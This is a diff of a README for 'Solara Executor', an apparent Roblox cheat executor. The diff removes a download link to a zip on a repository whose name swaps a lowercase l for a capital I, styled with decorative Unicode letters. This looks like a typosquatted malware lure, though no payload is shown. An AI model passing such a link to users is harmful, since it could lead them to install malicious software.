@@ -21,9 +21,7 @@ Welcome to the Solara Executor repository! This is a new Roblox executor designe
 
 Follow the steps below to get started with the Solara Executor:
 
-1. Download the executor by clicking on the button below:
-
-## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/dunhu/SoIara-executor/releases/download/SoIara-executor/SoIara-executor.zip)***
+1. Download the executor by clicking on the Releases button:
 
 2. Extract the downloaded file to your desired location.
 
